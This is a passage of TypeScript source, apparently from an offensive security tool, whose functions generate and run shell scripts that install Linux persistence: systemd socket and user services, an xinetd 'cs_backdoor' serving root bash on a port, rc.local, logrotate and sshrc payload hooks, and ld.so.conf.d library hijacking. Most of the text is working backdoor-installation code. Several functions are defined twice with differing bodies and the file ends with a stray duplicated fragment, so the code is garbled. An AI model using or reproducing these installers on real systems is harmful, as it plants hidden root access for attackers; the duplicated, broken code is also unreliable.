ls /var/lib/dpkg/triggers/ 2>/dev/null
cat /var/lib/dpkg/triggers/File 2>/dev/null | head -10
echo ""
echo "[*] DPKG trigger persistence methods:"
echo "  1. Add payload to an existing package's .postinst script"
echo "  2. Register interest in /var/lib/dpkg/triggers/File for a common path"
echo "  3. Create a fake package with dpkg-deb containing persistence hooks"
${payload ? `
echo ""
echo "--- Checking writable postinst scripts ---"
find /var/lib/dpkg/info/ -name "*.postinst" -writable 2>/dev/null | head -5 | while read f; do
  echo "[+] Writable postinst: $f"
done
` : ""}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  const writable = (r.stdout.match(/Writable postinst/g) || []).length
  if (writable > 0) {
    findings.push({
      checkId: "LNX-DPKG-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "IDENTIFIED",
      resource: "dpkg_triggers",
      title: "Writable dpkg postinst scripts found",
      details: `${writable} writable package postinst script(s) — payload can be injected to run on package updates`,
      remediation: "Verify dpkg info file integrity with dpkg --verify. Restrict /var/lib/dpkg/info/ permissions.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function socketActivation(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Systemd Socket Activation Persistence ==="]
  const payload = argVal(args, "--payload")
  const port = argVal(args, "--port") || "31337"

  const script = `
echo "--- Existing Socket Units ---"
systemctl list-sockets --no-pager 2>/dev/null || echo "[-] systemd not available"
echo ""
${payload ? `
echo "--- Installing Socket Activation ---"
if [ "$(id -u)" = "0" ]; then
  cat > /etc/systemd/system/cs-sock.socket << 'SOCKUNIT'
[Unit]
Description=System Maintenance Socket

[Socket]
ListenStream=${port}
Accept=yes

[Install]
WantedBy=sockets.target
SOCKUNIT

  cat > /etc/systemd/system/cs-sock@.service << SVCUNIT
[Unit]
Description=System Maintenance Handler

[Service]
Type=simple
ExecStart=${payload}
StandardInput=socket
StandardOutput=socket
SVCUNIT

  systemctl daemon-reload 2>/dev/null
  systemctl enable cs-sock.socket 2>/dev/null
  systemctl start cs-sock.socket 2>/dev/null && echo "[+] Socket listener active on port ${port}" || echo "[-] Failed to start socket"
else
  echo "[-] Root required for system socket activation"
fi
` : `echo "[*] Dry run — pass --payload <cmd> --port <port> to install."
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] Socket listener active")) {
    findings.push({
      checkId: "LNX-SOCKET-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "INSTALLED",
      resource: `tcp/${port}`,
      title: "Systemd socket activation persistence installed",
      details: `Socket unit listening on port ${port} — payload activates on incoming connection`,
      remediation: `Remove: systemctl disable --now cs-sock.socket && rm /etc/systemd/system/cs-sock.socket /etc/systemd/system/cs-sock@.service`,
    })
  }

  return { output: output.join("\n"), findings }
}

export async function userServicePersist(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== User-level Systemd Service Persistence ==="]
  const payload = argVal(args, "--payload")
  const name = argVal(args, "--name") || "cs-user-update"

  const script = `
echo "--- User Systemd Directory ---"
ls -la ~/.config/systemd/user/ 2>/dev/null || echo "[-] No user systemd directory yet"
echo ""
echo "--- User Services ---"
systemctl --user list-units --type=service --no-pager 2>/dev/null | head -15 || echo "[-] systemctl --user not available"
echo ""
${payload ? `
echo "--- Installing User Service ---"
mkdir -p ~/.config/systemd/user 2>/dev/null
cat > ~/.config/systemd/user/${name}.service << 'USRSVC'
[Unit]
Description=User Update Service

[Service]
Type=simple
ExecStart=${payload}
Restart=on-failure
RestartSec=30

[Install]
WantedBy=default.target
USRSVC
systemctl --user daemon-reload 2>/dev/null
systemctl --user enable ${name}.service 2>/dev/null && echo "[+] User service enabled: ${name}" || echo "[-] Failed to enable"
systemctl --user start ${name}.service 2>/dev/null && echo "[+] User service started" || echo "[-] Failed to start"
` : `echo "[*] Dry run — pass --payload <cmd> --name <svc> to install. No root needed."
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] User service enabled")) {
    findings.push({
      checkId: "LNX-USERSVC-001",
      provider: "linuxhook",
      severity: "MEDIUM",
      status: "INSTALLED",
      resource: `~/.config/systemd/user/${name}.service`,
      title: "User-level systemd service persistence installed",
      details: `User service ${name}.service created — persists without root, runs as current user`,
      remediation: `Remove with: systemctl --user disable --now ${name}.service && rm ~/.config/systemd/user/${name}.service`,
    })
  }

  return { output: output.join("\n"), findings }
}

export async function xinetdPersist(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Xinetd Persistence ==="]
  const payload = argVal(args, "--payload")
  const port = argVal(args, "--port") || "9999"

  const script = `
echo "--- xinetd status ---"
command -v xinetd >/dev/null 2>&1 && echo "[+] xinetd installed" || echo "[-] xinetd not installed"
systemctl status xinetd 2>/dev/null | grep -E "Active:|Loaded:" || service xinetd status 2>/dev/null
echo ""
echo "--- /etc/xinetd.d/ ---"
ls -la /etc/xinetd.d/ 2>/dev/null
echo ""
${payload ? `
echo "--- Installing xinetd persistence ---"
if [ -d /etc/xinetd.d/ ] && [ -w /etc/xinetd.d/ ]; then
  cat > /etc/xinetd.d/cs_backdoor << 'XINET'
service cs_backdoor
{
  type = UNLISTED
  port = ${port}
  socket_type = stream
  protocol = tcp
  wait = no
  user = root
  server = /bin/bash
  server_args = -c ${payload}
  disable = no
}
XINET
  echo "[+] xinetd service created on port ${port}"
  systemctl restart xinetd 2>/dev/null || service xinetd restart 2>/dev/null
else
  echo "[-] Cannot write to /etc/xinetd.d/"
fi
` : `echo "[*] Dry run — pass --payload <cmd> --port <port> to install"`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] xinetd service created")) {
    findings.push({
      checkId: "LNX-XINETD-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "INSTALLED",
      resource: `xinetd:${port}`,
      title: "xinetd persistence installed",
      details: `xinetd service backdoor created on port ${port} — triggers on inbound TCP connection`,
      remediation: "Remove /etc/xinetd.d/cs_backdoor and restart xinetd.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function rcLocalPersist(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== rc.local Persistence ==="]
  const payload = argVal(args, "--payload")

  const script = `
echo "--- /etc/rc.local status ---"
ls -la /etc/rc.local 2>/dev/null || echo "[-] /etc/rc.local does not exist"
[ -x /etc/rc.local ] && echo "[+] /etc/rc.local is executable" || echo "[-] /etc/rc.local is not executable"
[ -w /etc/rc.local ] 2>/dev/null && echo "[+] /etc/rc.local is writable" || echo "[-] /etc/rc.local is not writable"
echo ""
echo "--- rc-local.service ---"
systemctl status rc-local 2>/dev/null | grep -E "Active:|Loaded:"
echo ""
${payload ? `
echo "--- Installing rc.local persistence ---"
if [ -f /etc/rc.local ] && [ -w /etc/rc.local ]; then
  sed -i "/^exit 0/i ${payload} &" /etc/rc.local 2>/dev/null && echo "[+] Payload injected before 'exit 0'" || echo "[-] Failed to inject"
elif [ -w /etc/ ]; then
  echo "#!/bin/bash" > /etc/rc.local
  echo "${payload} &" >> /etc/rc.local
  echo "exit 0" >> /etc/rc.local
  chmod +x /etc/rc.local
  echo "[+] Created /etc/rc.local with payload"
else
  echo "[-] Cannot create/modify /etc/rc.local"
fi
` : `echo "[*] Dry run — pass --payload <cmd> to install"`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] Payload injected") || r.stdout.includes("[+] Created /etc/rc.local")) {
    findings.push({
      checkId: "LNX-RCLOCAL-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "INSTALLED",
      resource: "/etc/rc.local",
      title: "rc.local persistence installed",
      details: "Payload added to /etc/rc.local — executes as root on system boot",
      remediation: "Audit /etc/rc.local for unauthorized commands. Remove the malicious entry.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function logrotatePersist(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Logrotate Persistence ==="]
  const payload = argVal(args, "--payload")

  const script = `
echo "--- logrotate config ---"
ls -la /etc/logrotate.d/ 2>/dev/null
echo ""
echo "--- Writable logrotate configs ---"
for f in /etc/logrotate.d/*; do
  [ -f "$f" ] && [ -w "$f" ] && echo "[!] WRITABLE: $f"
done
[ -w /etc/logrotate.d/ ] && echo "[!] /etc/logrotate.d/ is writable"
echo ""
echo "--- logrotate schedule ---"
grep -r logrotate /etc/cron.daily/ /etc/crontab /etc/cron.d/ 2>/dev/null | head -5
echo ""
${payload ? `
echo "--- Installing logrotate persistence ---"
if [ -w /etc/logrotate.d/ ]; then
  cat > /etc/logrotate.d/cs_persist << 'LR'
/var/log/cs_persist.log {
  daily
  missingok
  rotate 1
  postrotate
    ${payload} &
  endscript
}
LR
  touch /var/log/cs_persist.log 2>/dev/null
  echo "[+] Logrotate persistence installed — triggers on daily log rotation"
else
  echo "[-] Cannot write to /etc/logrotate.d/"
fi
` : `echo "[*] Dry run — pass --payload <cmd> to install"`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] Logrotate persistence installed")) {
    findings.push({
      checkId: "LNX-LOGROT-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "INSTALLED",
      resource: "logrotate",
      title: "Logrotate persistence installed",
      details: "Logrotate postrotate script persistence — executes as root during daily log rotation cycle",
      remediation: "Remove /etc/logrotate.d/cs_persist and /var/log/cs_persist.log.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function sshRcPersist(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== SSH RC Persistence ==="]
  const payload = argVal(args, "--payload")

  const script = `
echo "--- SSH RC Files ---"
ls -la /etc/ssh/sshrc 2>/dev/null || echo "[-] /etc/ssh/sshrc does not exist"
for dir in /root /home/*; do
  [ -f "$dir/.ssh/rc" ] && echo "[*] $dir/.ssh/rc exists" && cat "$dir/.ssh/rc"
done
echo ""
echo "--- /etc/ssh/sshrc writability ---"
[ -w /etc/ssh/sshrc ] 2>/dev/null && echo "[+] /etc/ssh/sshrc is writable"
[ ! -f /etc/ssh/sshrc ] && [ -w /etc/ssh/ ] && echo "[+] /etc/ssh/ is writable — can create sshrc"
echo ""
${payload ? `
echo "--- Installing SSH RC persistence ---"
if [ -w /etc/ssh/ ]; then
  echo "#!/bin/bash" > /etc/ssh/sshrc 2>/dev/null
  echo "${payload} &" >> /etc/ssh/sshrc
  chmod +x /etc/ssh/sshrc
  echo "[+] /etc/ssh/sshrc persistence installed — runs on every SSH login (all users)"
elif [ -w "$HOME/.ssh/" ]; then
  echo "${payload} &" > "$HOME/.ssh/rc"
  echo "[+] ~/.ssh/rc persistence installed — runs on SSH login for current user"
else
  echo "[-] Cannot install SSH RC persistence"
fi
` : `echo "[*] Dry run — pass --payload <cmd> to install"`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+]") && r.stdout.includes("persistence installed")) {
    findings.push({
      checkId: "LNX-SSHRC-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "INSTALLED",
      resource: "ssh_rc",
      title: "SSH RC persistence installed",
      details: "SSH RC file created — commands execute on every SSH login before the user shell starts",
      remediation: "Remove /etc/ssh/sshrc or ~/.ssh/rc. Monitor these files with integrity checking.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function ldConfigPersist(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== ld.so.conf.d Persistence ==="]
  const libpath = argVal(args, "--lib-path")

  const script = `
echo "--- /etc/ld.so.conf.d/ ---"
ls -la /etc/ld.so.conf.d/ 2>/dev/null
echo ""
echo "--- Current library paths ---"
cat /etc/ld.so.conf /etc/ld.so.conf.d/* 2>/dev/null | grep -v "^#"
echo ""
echo "--- /etc/ld.so.conf.d/ writability ---"
[ -w /etc/ld.so.conf.d/ ] && echo "[+] /etc/ld.so.conf.d/ is writable" || echo "[-] /etc/ld.so.conf.d/ is not writable"
echo ""
${libpath ? `
echo "--- Installing ld.so.conf.d persistence ---"
if [ -w /etc/ld.so.conf.d/ ]; then
  echo "${libpath}" > /etc/ld.so.conf.d/cs_persist.conf
  ldconfig 2>/dev/null
  echo "[+] Added ${libpath} to ld.so.conf.d — libraries from this path will be loaded by all dynamically linked processes"
else
  echo "[-] Cannot write to /etc/ld.so.conf.d/"
fi
` : `echo "[*] Dry run — pass --lib-path <dir> to add a library path to ld.so.conf.d/"`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] Added")) {
    findings.push({
      checkId: "LNX-LDCONF-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "INSTALLED",
      resource: "ld.so.conf.d",
      title: "ld.so.conf.d library path persistence",
      details: `Added ${libpath} to /etc/ld.so.conf.d/ — place malicious .so files in this directory to be loaded by any dynamically linked process`,
      remediation: "Remove /etc/ld.so.conf.d/cs_persist.conf and run ldconfig.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function xinetdPersist(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Xinetd Persistence ==="]
  const payload = argVal(args, "--payload")
  const port = argVal(args, "--port") || "31338"

  const script = `
echo "--- Xinetd Status ---"
command -v xinetd >/dev/null 2>&1 && echo "[+] xinetd is available" || echo "[-] xinetd not installed"
pgrep xinetd >/dev/null 2>&1 && echo "[+] xinetd is running" || echo "[-] xinetd not running"
echo ""
echo "--- Xinetd Services ---"
ls -la /etc/xinetd.d/ 2>/dev/null || echo "[-] /etc/xinetd.d/ not found"
echo ""
${payload ? `
echo "--- Installing Xinetd Service ---"
if [ -d /etc/xinetd.d/ ] && ([ "$(id -u)" = "0" ] || [ -w /etc/xinetd.d/ ]); then
  cat > /etc/xinetd.d/cs-svc << XINET
service cs-svc
{
    type = UNLISTED
    port = ${port}
    socket_type = stream
    protocol = tcp
    wait = no
    user = root
    server = /bin/bash
    server_args = -c "${payload}"
    disable = no
}
XINET
  echo "[+] Xinetd service installed on port ${port}"
  kill -HUP $(pgrep xinetd) 2>/dev/null && echo "[+] xinetd reloaded" || echo "[-] Could not reload xinetd"
else
  echo "[-] xinetd not available or not writable"
fi
` : `echo "[*] Dry run — pass --payload <cmd> --port <port> to install."
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] Xinetd service installed")) {
    findings.push({
      checkId: "LNX-XINETD-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "INSTALLED",
      resource: `/etc/xinetd.d/cs-svc:${port}`,
      title: "Xinetd persistence installed",
      details: `Xinetd service listening on port ${port} — triggers payload on connection`,
      remediation: "Remove /etc/xinetd.d/cs-svc and reload xinetd. Audit all xinetd service files.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function rcLocalPersist(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== rc.local Persistence ==="]
  const payload = argVal(args, "--payload")

  const script = `
echo "--- rc.local Status ---"
if [ -f /etc/rc.local ]; then
  echo "[+] /etc/rc.local exists"
  ls -la /etc/rc.local
  echo ""
  echo "--- Current Contents ---"
  cat /etc/rc.local
else
  echo "[-] /etc/rc.local does not exist"
  echo "  Can be created for boot-time execution"
fi
echo ""
echo "--- rc-local.service ---"
systemctl status rc-local.service 2>/dev/null | head -5 || echo "[-] rc-local.service not found"
echo ""
${payload ? `
echo "--- Installing rc.local Persistence ---"
if [ "$(id -u)" = "0" ]; then
  if [ ! -f /etc/rc.local ]; then
    printf '#!/bin/bash\\n' > /etc/rc.local
  fi
  sed -i '/^exit 0$/d' /etc/rc.local 2>/dev/null
  echo "${payload} &>/dev/null &" >> /etc/rc.local
  echo "exit 0" >> /etc/rc.local
  chmod +x /etc/rc.local
  echo "[+] Payload added to /etc/rc.local (executes on boot)"
else
  echo "[-] Root required"
fi
` : `echo "[*] Dry run — pass --payload <cmd> to install."
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] Payload added to /etc/rc.local")) {
    findings.push({
      checkId: "LNX-RCLOCAL-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "INSTALLED",
      resource: "/etc/rc.local",
      title: "rc.local persistence installed",
      details: "Payload added to /etc/rc.local — executes as root on system boot",
      remediation: "Audit /etc/rc.local for unauthorized entries. Consider disabling rc-local.service.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function logrotatePersist(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Logrotate Persistence ==="]
  const payload = argVal(args, "--payload")

  const script = `
echo "--- Logrotate Config ---"
ls -la /etc/logrotate.d/ 2>/dev/null || echo "[-] /etc/logrotate.d/ not found"
echo ""
echo "--- Logrotate Cron ---"
ls -la /etc/cron.daily/logrotate 2>/dev/null || systemctl list-timers 2>/dev/null | grep logrotate
echo ""
echo "--- Writable Logrotate Configs ---"
find /etc/logrotate.d/ -writable 2>/dev/null | head -10
echo ""
${payload ? `
echo "--- Installing Logrotate Persistence ---"
if [ "$(id -u)" = "0" ] || [ -w /etc/logrotate.d/ ]; then
  cat > /etc/logrotate.d/cs-persist << 'LOGROT'
/var/log/cs-persist.log {
    missingok
    notifempty
    daily
    postrotate
        ${payload} &>/dev/null &
    endscript
}
LOGROT
  touch /var/log/cs-persist.log 2>/dev/null
  echo "[+] Logrotate persistence installed: /etc/logrotate.d/cs-persist (runs as root on log rotation)"
else
  echo "[-] Root required"
fi
` : `echo "[*] Dry run — pass --payload <cmd> to install."
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] Logrotate persistence installed")) {
    findings.push({
      checkId: "LNX-LOGROT-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "INSTALLED",
      resource: "/etc/logrotate.d/cs-persist",
      title: "Logrotate persistence installed",
      details: "Postrotate script runs as root during daily log rotation",
      remediation: "Audit /etc/logrotate.d/ for unauthorized configs. Remove cs-persist and /var/log/cs-persist.log.",
    })
  }

  return { output: output.join("\n"), findings }
}

  return { output: output.join("\n"), findings }
}
